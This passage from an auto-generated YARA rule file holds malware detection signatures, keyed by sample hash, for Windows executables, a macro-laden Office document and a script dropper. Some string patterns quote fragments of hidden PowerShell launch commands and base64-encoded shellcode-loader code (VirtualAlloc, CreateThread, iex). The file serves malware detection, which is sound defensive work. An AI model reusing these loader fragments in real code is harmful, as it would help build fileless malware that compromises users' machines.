      $s16 = "0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                              ' */ /* score: '21.00'*/
      $s17 = "var tmp_path = fso.GetSpecialFolder(2) + '\\\\' + fso.GetTempName();" fullword ascii /* score: '20.00'*/
      $s18 = "cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string 'p                                               ' */ /* score: '20.00'*/
      $s19 = "AAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '          @                  ' */ /* score: '18.50'*/
      $s20 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAACB" ascii /* base64 encoded string '                       ' */ /* score: '18.50'*/
   condition:
      uint16(0) == 0x6176 and filesize < 1000KB and
      8 of them
}

rule sig_2f6c15714bff3a5c6761ef2f1e61af96fac718abacefdb4e74c9a94ab5974600 {
   meta:
      description = "mw - file 2f6c15714bff3a5c6761ef2f1e61af96fac718abacefdb4e74c9a94ab5974600"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "2f6c15714bff3a5c6761ef2f1e61af96fac718abacefdb4e74c9a94ab5974600"
   strings:
      $s1 = "processthreadsapi.h" fullword ascii /* score: '15.00'*/
      $s2 = ".GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '15.00'*/
      $s3 = "  VirtualQuery failed for %d bytes at address %p" fullword ascii /* score: '13.00'*/
      $s4 = "libloaderapi.h" fullword ascii /* score: '13.00'*/
      $s5 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." fullword ascii /* score: '12.50'*/
      $s6 = "!GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s7 = "$GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s8 = "/GetLastError" fullword ascii /* score: '12.00'*/
      $s9 = "___mingw_winmain_lpCmdLine" fullword ascii /* score: '12.00'*/
      $s10 = "9GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s11 = "GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s12 = "lpszCommandLine" fullword ascii /* score: '12.00'*/
      $s13 = "5GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s14 = "__mingw_winmain_lpCmdLine" fullword ascii /* score: '12.00'*/
      $s15 = "powi.def.h" fullword ascii /* score: '10.00'*/
      $s16 = "#__mingwthr_run_key_dtors" fullword ascii /* score: '10.00'*/
      $s17 = "B__report_error" fullword ascii /* score: '10.00'*/
      $s18 = "pNTHeader32" fullword ascii /* score: '10.00'*/
      $s19 = "pNTHeader64" fullword ascii /* score: '10.00'*/
      $s20 = "__get_invalid_parameter_handler" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      8 of them
}

rule sig_5f4740ee065cca602b02be671fb078b63bb5fe2f733614c7207a87ab9b9454dd {
   meta:
      description = "mw - file 5f4740ee065cca602b02be671fb078b63bb5fe2f733614c7207a87ab9b9454dd"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "5f4740ee065cca602b02be671fb078b63bb5fe2f733614c7207a87ab9b9454dd"
   strings:
      $s1 = "bocxghcnqemmj.dll" fullword ascii /* score: '23.00'*/
      $s2 = "pkkbyarkznpzvr.dll" fullword ascii /* score: '23.00'*/
      $s3 = "processthreadsapi.h" fullword ascii /* score: '15.00'*/
      $s4 = "  VirtualQuery failed for %d bytes at address %p" fullword ascii /* score: '13.00'*/
      $s5 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." fullword ascii /* score: '12.50'*/
      $s6 = "!GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s7 = "$GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s8 = "/GetLastError" fullword ascii /* score: '12.00'*/
      $s9 = "___mingw_winmain_lpCmdLine" fullword ascii /* score: '12.00'*/
      $s10 = "GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s11 = "lpszCommandLine" fullword ascii /* score: '12.00'*/
      $s12 = "5GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s13 = "__mingw_winmain_lpCmdLine" fullword ascii /* score: '12.00'*/
      $s14 = "#__mingwthr_run_key_dtors" fullword ascii /* score: '10.00'*/
      $s15 = "B__report_error" fullword ascii /* score: '10.00'*/
      $s16 = "pNTHeader32" fullword ascii /* score: '10.00'*/
      $s17 = "pNTHeader64" fullword ascii /* score: '10.00'*/
      $s18 = "__get_invalid_parameter_handler" fullword ascii /* score: '9.00'*/
      $s19 = "./mingw-w64-crt/crt/dllargv.c" fullword ascii /* score: '9.00'*/
      $s20 = "__head_lib32_libmsvcrt_def_a" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      8 of them
}

rule sig_77373a2d0c22152cf281cbedf8d8e8f71b70e3196faa6f3d8fa5392bd25109a9 {
   meta:
      description = "mw - file 77373a2d0c22152cf281cbedf8d8e8f71b70e3196faa6f3d8fa5392bd25109a9"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "77373a2d0c22152cf281cbedf8d8e8f71b70e3196faa6f3d8fa5392bd25109a9"
   strings:
      $s1 = "processthreadsapi.h" fullword ascii /* score: '15.00'*/
      $s2 = ".GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '15.00'*/
      $s3 = "  VirtualQuery failed for %d bytes at address %p" fullword ascii /* score: '13.00'*/
      $s4 = "libloaderapi.h" fullword ascii /* score: '13.00'*/
      $s5 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." fullword ascii /* score: '12.50'*/
      $s6 = "!GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s7 = "$GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s8 = "/GetLastError" fullword ascii /* score: '12.00'*/
      $s9 = "___mingw_winmain_lpCmdLine" fullword ascii /* score: '12.00'*/
      $s10 = "9GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s11 = "GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s12 = "lpszCommandLine" fullword ascii /* score: '12.00'*/
      $s13 = "5GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s14 = "__mingw_winmain_lpCmdLine" fullword ascii /* score: '12.00'*/
      $s15 = "powi.def.h" fullword ascii /* score: '10.00'*/
      $s16 = "#__mingwthr_run_key_dtors" fullword ascii /* score: '10.00'*/
      $s17 = "B__report_error" fullword ascii /* score: '10.00'*/
      $s18 = "pNTHeader32" fullword ascii /* score: '10.00'*/
      $s19 = "pNTHeader64" fullword ascii /* score: '10.00'*/
      $s20 = "__get_invalid_parameter_handler" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      8 of them
}

rule a857544f055d8d01a6c8dcf7c2d24ba065ba3c11800b8ce72d3eb530ab6321c6 {
   meta:
      description = "mw - file a857544f055d8d01a6c8dcf7c2d24ba065ba3c11800b8ce72d3eb530ab6321c6"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "a857544f055d8d01a6c8dcf7c2d24ba065ba3c11800b8ce72d3eb530ab6321c6"
   strings:
      $s1 = "rylzbmtbsfpb.dll" fullword ascii /* score: '23.00'*/
      $s2 = "processthreadsapi.h" fullword ascii /* score: '15.00'*/
      $s3 = "  VirtualQuery failed for %d bytes at address %p" fullword ascii /* score: '13.00'*/
      $s4 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." fullword ascii /* score: '12.50'*/
      $s5 = "!GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s6 = "$GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s7 = "/GetLastError" fullword ascii /* score: '12.00'*/
      $s8 = "___mingw_winmain_lpCmdLine" fullword ascii /* score: '12.00'*/
      $s9 = "GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s10 = "lpszCommandLine" fullword ascii /* score: '12.00'*/
      $s11 = "5GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s12 = "__mingw_winmain_lpCmdLine" fullword ascii /* score: '12.00'*/
      $s13 = "Mozilla/5.0 (iPad; CPU OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1" ascii /* score: '12.00'*/
      $s14 = "#__mingwthr_run_key_dtors" fullword ascii /* score: '10.00'*/
      $s15 = "B__report_error" fullword ascii /* score: '10.00'*/
      $s16 = "pNTHeader32" fullword ascii /* score: '10.00'*/
      $s17 = "pNTHeader64" fullword ascii /* score: '10.00'*/
      $s18 = "__get_invalid_parameter_handler" fullword ascii /* score: '9.00'*/
      $s19 = "./mingw-w64-crt/crt/dllargv.c" fullword ascii /* score: '9.00'*/
      $s20 = "__head_lib32_libmsvcrt_def_a" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      8 of them
}

rule cb6bc2fd5c259704785d403d7fb34dbabfb62435c56e0eaf82d05bc8839c865a {
   meta:
      description = "mw - file cb6bc2fd5c259704785d403d7fb34dbabfb62435c56e0eaf82d05bc8839c865a"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "cb6bc2fd5c259704785d403d7fb34dbabfb62435c56e0eaf82d05bc8839c865a"
   strings:
      $s1 = "lqiogclbtmhan.dll" fullword ascii /* score: '23.00'*/
      $s2 = "processthreadsapi.h" fullword ascii /* score: '15.00'*/
      $s3 = "  VirtualQuery failed for %d bytes at address %p" fullword ascii /* score: '13.00'*/
      $s4 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." fullword ascii /* score: '12.50'*/
      $s5 = "!GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s6 = "$GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s7 = "/GetLastError" fullword ascii /* score: '12.00'*/
      $s8 = "___mingw_winmain_lpCmdLine" fullword ascii /* score: '12.00'*/
      $s9 = "GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s10 = "lpszCommandLine" fullword ascii /* score: '12.00'*/
      $s11 = "5GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s12 = "__mingw_winmain_lpCmdLine" fullword ascii /* score: '12.00'*/
      $s13 = "Mozilla/5.0 (iPad; CPU OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1" ascii /* score: '12.00'*/
      $s14 = "#__mingwthr_run_key_dtors" fullword ascii /* score: '10.00'*/
      $s15 = "B__report_error" fullword ascii /* score: '10.00'*/
      $s16 = "pNTHeader32" fullword ascii /* score: '10.00'*/
      $s17 = "pNTHeader64" fullword ascii /* score: '10.00'*/
      $s18 = "__get_invalid_parameter_handler" fullword ascii /* score: '9.00'*/
      $s19 = "./mingw-w64-crt/crt/dllargv.c" fullword ascii /* score: '9.00'*/
      $s20 = "__head_lib32_libmsvcrt_def_a" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      8 of them
}

rule fdd4555ee11ccc2d4e86bbfdf0e294f1996d4f283029ab0b4f4cc6e876ebe5a7 {
   meta:
      description = "mw - file fdd4555ee11ccc2d4e86bbfdf0e294f1996d4f283029ab0b4f4cc6e876ebe5a7"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "fdd4555ee11ccc2d4e86bbfdf0e294f1996d4f283029ab0b4f4cc6e876ebe5a7"
   strings:
      $s1 = "dtpxicdblqvv.dll" fullword ascii /* score: '23.00'*/
      $s2 = "processthreadsapi.h" fullword ascii /* score: '15.00'*/
      $s3 = "  VirtualQuery failed for %d bytes at address %p" fullword ascii /* score: '13.00'*/
      $s4 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." fullword ascii /* score: '12.50'*/
      $s5 = "!GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s6 = "$GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s7 = "/GetLastError" fullword ascii /* score: '12.00'*/
      $s8 = "___mingw_winmain_lpCmdLine" fullword ascii /* score: '12.00'*/
      $s9 = "GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s10 = "lpszCommandLine" fullword ascii /* score: '12.00'*/
      $s11 = "5GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s12 = "__mingw_winmain_lpCmdLine" fullword ascii /* score: '12.00'*/
      $s13 = "powi.def.h" fullword ascii /* score: '10.00'*/
      $s14 = "#__mingwthr_run_key_dtors" fullword ascii /* score: '10.00'*/
      $s15 = "B__report_error" fullword ascii /* score: '10.00'*/
      $s16 = "pNTHeader32" fullword ascii /* score: '10.00'*/
      $s17 = "pNTHeader64" fullword ascii /* score: '10.00'*/
      $s18 = "__get_invalid_parameter_handler" fullword ascii /* score: '9.00'*/
      $s19 = "./mingw-w64-crt/crt/dllargv.c" fullword ascii /* score: '9.00'*/
      $s20 = "__head_lib32_libmsvcrt_def_a" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      8 of them
}

rule sig_3185876cb0717e3d8d6afadc8cbb2d439ad01cc3f4e172936b0d0ebc398c082c {
   meta:
      description = "mw - file 3185876cb0717e3d8d6afadc8cbb2d439ad01cc3f4e172936b0d0ebc398c082c"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "3185876cb0717e3d8d6afadc8cbb2d439ad01cc3f4e172936b0d0ebc398c082c"
   strings:
      $s1 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.8#0#C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL#Microsoft " wide /* score: '28.00'*/
      $s2 = "shell.exe -NoE -NoP -NonI -W Hidden -E " fullword ascii /* score: '27.00'*/
      $s3 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.2#9#C:\\Program Files\\Common Files\\Microsoft Shared\\VBA\\VBA7.1\\VBE7.DLL#Visual" wide /* score: '24.00'*/
      $s4 = "ADAALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAA2ADAALAAwAHgAMwAxACwAMAB4AGQAMgAsADAAeAA4ADkALAAwAHgAZQA1ACwAMAB4ADYANAAsADAAeAA4AGIALAAw" ascii /* base64 encoded string ' 0 , 0 x 0 0 , 0 x 0 0 , 0 x 6 0 , 0 x 3 1 , 0 x d 2 , 0 x 8 9 , 0 x e 5 , 0 x 6 4 , 0 x 8 b , 0' */ /* score: '21.00'*/
      $s5 = "AHgANABlACwAMAB4ADAAOAAsADAAeAA3ADUALAAwAHgAZQBjACwAMAB4ADYAOAAsADAAeABmADAALAAwAHgAYgA1ACwAMAB4AGEAMgAsADAAeAA1ADYALAAwAHgAZgBm" ascii /* base64 encoded string ' x 4 e , 0 x 0 8 , 0 x 7 5 , 0 x e c , 0 x 6 8 , 0 x f 0 , 0 x b 5 , 0 x a 2 , 0 x 5 6 , 0 x f f' */ /* score: '21.00'*/
      $s6 = "ACQAeAA9ACQAdwA6ADoAVgBpAHIAdAB1AGEAbABBAGwAbABvAGMAKAAwACwAMAB4ADEAMAAwADAALAAkAHMAaQB6AGUALAAwAHgANAAwACkAOwBmAG8AcgAgACgAJABp" ascii /* base64 encoded string ' $ x = $ w : : V i r t u a l A l l o c ( 0 , 0 x 1 0 0 0 , $ s i z e , 0 x 4 0 ) ; f o r   ( $ i' */ /* score: '21.00'*/
      $s7 = "ACwAMAB4ADgAYgAsADAAeAAzADQALAAwAHgAOABiACwAMAB4ADMAMQAsADAAeABmAGYALAAwAHgAMAAxACwAMAB4AGQANgAsADAAeAAzADEALAAwAHgAYwAwACwAMAB4" ascii /* base64 encoded string ' , 0 x 8 b , 0 x 3 4 , 0 x 8 b , 0 x 3 1 , 0 x f f , 0 x 0 1 , 0 x d 6 , 0 x 3 1 , 0 x c 0 , 0 x' */ /* score: '21.00'*/
      $s8 = "MAB4ADAAMgAsADAAeAAwADAALAAwAHgAMgA4ACwAMAB4ADUANAAsADAAeAA4ADkALAAwAHgAZQA2ACwAMAB4ADUAMAAsADAAeAA1ADAALAAwAHgANQAwACwAMAB4ADUA" ascii /* base64 encoded string '0 x 0 2 , 0 x 0 0 , 0 x 2 8 , 0 x 5 4 , 0 x 8 9 , 0 x e 6 , 0 x 5 0 , 0 x 5 0 , 0 x 5 0 , 0 x 5 ' */ /* score: '21.00'*/
      $s9 = "eABhADQALAAwAHgANQAzACwAMAB4AGUANQAsADAAeABmAGYALAAwAHgAZAA1ACwAMAB4ADkAMwAsADAAeAA1ADMALAAwAHgANgBhACwAMAB4ADAAMAAsADAAeAA1ADYA" ascii /* base64 encoded string 'x a 4 , 0 x 5 3 , 0 x e 5 , 0 x f f , 0 x d 5 , 0 x 9 3 , 0 x 5 3 , 0 x 6 a , 0 x 0 0 , 0 x 5 6 ' */ /* score: '21.00'*/
      $s10 = "LAAwAHgANQA4ACwAMAB4ADEAYwAsADAAeAAwADEALAAwAHgAZAAzACwAMAB4ADgAYgAsADAAeAAwADQALAAwAHgAOABiACwAMAB4ADAAMQAsADAAeABkADAALAAwAHgA" ascii /* base64 encoded string ', 0 x 5 8 , 0 x 1 c , 0 x 0 1 , 0 x d 3 , 0 x 8 b , 0 x 0 4 , 0 x 8 b , 0 x 0 1 , 0 x d 0 , 0 x ' */ /* score: '21.00'*/
      $s11 = "*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\Windows\\System32\\stdole2.tlb#OLE Automation" fullword wide /* score: '21.00'*/
      $s12 = "dABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAG0AZQBtAHMAZQB0ACgASQBuAHQAUAB0AHIAIABkAGUAcwB0ACwAIAB1AGkAbgB0ACAAcwByAGMA" ascii /* base64 encoded string 't a t i c   e x t e r n   I n t P t r   m e m s e t ( I n t P t r   d e s t ,   u i n t   s r c ' */ /* score: '17.00'*/
      $s13 = "ADAAeAA3ADcALAAwAHgANwAzACwAMAB4ADMAMgAsADAAeAA1AGYALAAwAHgANQA0ACwAMAB4ADYAOAAsADAAeAA0AGMALAAwAHgANwA3ACwAMAB4ADIANgAsADAAeAAw" ascii /* base64 encoded string ' 0 x 7 7 , 0 x 7 3 , 0 x 3 2 , 0 x 5 f , 0 x 5 4 , 0 x 6 8 , 0 x 4 c , 0 x 7 7 , 0 x 2 6 , 0 x 0' */ /* score: '17.00'*/
      $s14 = "ZAAsADAAeAAwADEALAAwAHgAYwA3ACwAMAB4ADQAOQAsADAAeAA3ADUALAAwAHgAZQBmACwAMAB4ADUAMgAsADAAeAA1ADcALAAwAHgAOABiACwAMAB4ADUAMgAsADAA" ascii /* base64 encoded string 'd , 0 x 0 1 , 0 x c 7 , 0 x 4 9 , 0 x 7 5 , 0 x e f , 0 x 5 2 , 0 x 5 7 , 0 x 8 b , 0 x 5 2 , 0 ' */ /* score: '17.00'*/
      $s15 = "JAAxACAAPQAgACcAJABjACAAPQAgACcAJwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMA" ascii /* base64 encoded string '$ 1   =   ' $ c   =   ' ' [ D l l I m p o r t ( " k e r n e l 3 2 . d l l " ) ] p u b l i c   s ' */ /* score: '17.00'*/
      $s16 = "ACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgASQBuAHQAUAB0AHIAIABsAHAAVABoAHIAZQBhAGQAQQB0AHQAcgBp" ascii /* base64 encoded string '   e x t e r n   I n t P t r   C r e a t e T h r e a d ( I n t P t r   l p T h r e a d A t t r i' */ /* score: '17.00'*/
      $s17 = "AHAAIAAtAG4AbwBuAGkAIAAtAGUAbgBjACAAIgA7AGkAZQB4ACAAIgAmACAAJAB4ADgANgAgACQAYwBtAGQAIAAkAGcAcQAiAH0AZQBsAHMAZQB7ACQAYwBtAGQAIAA9" ascii /* base64 encoded string ' p   - n o n i   - e n c   " ; i e x   " &   $ x 8 6   $ c m d   $ g q " } e l s e { $ c m d   =' */ /* score: '17.00'*/
      $s18 = "ZwBxACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBUAGUA" ascii /* base64 encoded string 'g q   =   [ S y s t e m . C o n v e r t ] : : T o B a s e 6 4 S t r i n g ( [ S y s t e m . T e ' */ /* score: '17.00'*/
      $s19 = "*\\G{00020905-0000-0000-C000-000000000046}#8.7#0#C:\\Program Files\\Microsoft Office\\root\\Office16\\MSWORD.OLB#Microsoft Word " wide /* score: '16.00'*/
      $s20 = "ADAAeAA1ADAA" ascii /* base64 encoded string ' 0 x 5 0 ' */ /* score: '14.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 100KB and
      8 of them
}

rule sig_517c28639a180fd2e1acdb0142f126ad90ce46333096e07f5064adc1a0b48292 {
   meta:
      description = "mw - file 517c28639a180fd2e1acdb0142f126ad90ce46333096e07f5064adc1a0b48292"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "517c28639a180fd2e1acdb0142f126ad90ce46333096e07f5064adc1a0b48292"
   strings:
      $x1 = "kBihvyXQudreo.run('%windir%\\\\System32\\\\' + sxZZwnknPuNBTDuCtzI + ' /c powershell -w 1 -C \"sv Sf -;sv W ec;sv ww ((gv Sf).va" ascii /* score: '36.00'*/
      $x2 = "kBihvyXQudreo.run('%windir%\\\\System32\\\\' + sxZZwnknPuNBTDuCtzI + ' /c powershell -w 1 -C \"sv Sf -;sv W ec;sv ww ((gv Sf).va" ascii /* score: '32.00'*/
      $s3 = "AeAAxADAAMAAwACwAJABhAGUALAAwAHgANAAwACkAOwBmAG8AcgAgACgAJABOAE4APQAwADsAJABOAE4AIAAtAGwAZQAgACgAJABzAEgALgBMAGUAbgBnAHQAaAAtADE" ascii /* base64 encoded string 'x 1 0 0 0 , $ a e , 0 x 4 0 ) ; f o r   ( $ N N = 0 ; $ N N   - l e   ( $ s H . L e n g t h - 1' */ /* score: '21.00'*/
      $s4 = "AeABlAGYALAAwAHgANQAyACwAMAB4ADUANwAsADAAeAA4AGIALAAwAHgANQAyACwAMAB4ADEAMAAsADAAeAA4AGIALAAwAHgANAAyACwAMAB4ADMAYwAsADAAeAAwADE" ascii /* base64 encoded string 'x e f , 0 x 5 2 , 0 x 5 7 , 0 x 8 b , 0 x 5 2 , 0 x 1 0 , 0 x 8 b , 0 x 4 2 , 0 x 3 c , 0 x 0 1' */ /* score: '21.00'*/
      $s5 = "AYwAzACwAMAB4ADUAZgAsADAAeABlADgALAAwAHgANwBkACwAMAB4AGYAZgAsADAAeABmAGYALAAwAHgAZgBmACwAMAB4ADMAMQAsADAAeAAzADQALAAwAHgAMwAzACw" ascii /* base64 encoded string 'c 3 , 0 x 5 f , 0 x e 8 , 0 x 7 d , 0 x f f , 0 x f f , 0 x f f , 0 x 3 1 , 0 x 3 4 , 0 x 3 3 ,' */ /* score: '21.00'*/
      $s6 = "AIABBAGQAZAAtAFQAeQBwAGUAIAAtAG0AZQBtAGIAZQByAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAEsAdwAgAC0ATgBhAG0AZQAgACIAVwBpAG4AMwAyACIAIAAtAG4" ascii /* base64 encoded string '  A d d - T y p e   - m e m b e r D e f i n i t i o n   $ K w   - N a m e   " W i n 3 2 "   - n' */ /* score: '21.00'*/
      $s7 = "AMAB4ADYAOAAsADAAeAAyAGQALAAwAHgAMAA2ACwAMAB4ADEAOAAsADAAeAA3AGIALAAwAHgAZgBmACwAMAB4AGQANQAsADAAeAA4ADUALAAwAHgAYwAwACwAMAB4ADc" ascii /* base64 encoded string '0 x 6 8 , 0 x 2 d , 0 x 0 6 , 0 x 1 8 , 0 x 7 b , 0 x f f , 0 x d 5 , 0 x 8 5 , 0 x c 0 , 0 x 7' */ /* score: '21.00'*/
      $s8 = "ALAAwAHgAYQAyACwAMAB4ADUANgAsADAAeABmAGYALAAwAHgAZAA1ACwAMAB4ADYAYQAsADAAeAA0ADAALAAwAHgANgA4ACwAMAB4ADAAMAAsADAAeAAxADAALAAwAHg" ascii /* base64 encoded string ', 0 x a 2 , 0 x 5 6 , 0 x f f , 0 x d 5 , 0 x 6 a , 0 x 4 0 , 0 x 6 8 , 0 x 0 0 , 0 x 1 0 , 0 x' */ /* score: '21.00'*/
      $s9 = "AMAB4AGEANAAsADAAeAA1ADMALAAwAHgAZQA1ACwAMAB4AGYAZgAsADAAeABkADUALAAwAHgAOQAzACwAMAB4ADUAMwAsADAAeAA1ADMALAAwAHgAOAA5ACwAMAB4AGU" ascii /* base64 encoded string '0 x a 4 , 0 x 5 3 , 0 x e 5 , 0 x f f , 0 x d 5 , 0 x 9 3 , 0 x 5 3 , 0 x 5 3 , 0 x 8 9 , 0 x e' */ /* score: '21.00'*/
      $s10 = "AMAB4ADAANAAsADAAeAA4AGIALAAwAHgAMAAxACwAMAB4AGQAMAAsADAAeAA4ADkALAAwAHgANAA0ACwAMAB4ADIANAAsADAAeAAyADQALAAwAHgANQBiACwAMAB4ADU" ascii /* base64 encoded string '0 x 0 4 , 0 x 8 b , 0 x 0 1 , 0 x d 0 , 0 x 8 9 , 0 x 4 4 , 0 x 2 4 , 0 x 2 4 , 0 x 5 b , 0 x 5' */ /* score: '21.00'*/
      $s11 = "AZAAwACwAMAB4ADgAYgAsADAAeAA1ADgALAAwAHgAMgAwACwAMAB4ADUAMAAsADAAeAA4AGIALAAwAHgANAA4ACwAMAB4ADEAOAAsADAAeAAwADEALAAwAHgAZAAzACw" ascii /* base64 encoded string 'd 0 , 0 x 8 b , 0 x 5 8 , 0 x 2 0 , 0 x 5 0 , 0 x 8 b , 0 x 4 8 , 0 x 1 8 , 0 x 0 1 , 0 x d 3 ,' */ /* score: '21.00'*/
      $s12 = "ALAAwAHgAZAAwACwAMAB4ADgAYgAsADAAeAA0ADAALAAwAHgANwA4ACwAMAB4ADgANQAsADAAeABjADAALAAwAHgANwA0ACwAMAB4ADQAYwAsADAAeAAwADEALAAwAHg" ascii /* base64 encoded string ', 0 x d 0 , 0 x 8 b , 0 x 4 0 , 0 x 7 8 , 0 x 8 5 , 0 x c 0 , 0 x 7 4 , 0 x 4 c , 0 x 0 1 , 0 x' */ /* score: '21.00'*/
      $s13 = "AZgAsADAAeABkADUALAAwAHgANQAzACwAMAB4ADUAMwAsADAAeAA2AGEALAAwAHgAMAAzACwAMAB4ADUAMwAsADAAeAA1ADMALAAwAHgANgA4ACwAMAB4ADkAMgAsADA" ascii /* base64 encoded string 'f , 0 x d 5 , 0 x 5 3 , 0 x 5 3 , 0 x 6 a , 0 x 0 3 , 0 x 5 3 , 0 x 5 3 , 0 x 6 8 , 0 x 9 2 , 0' */ /* score: '21.00'*/
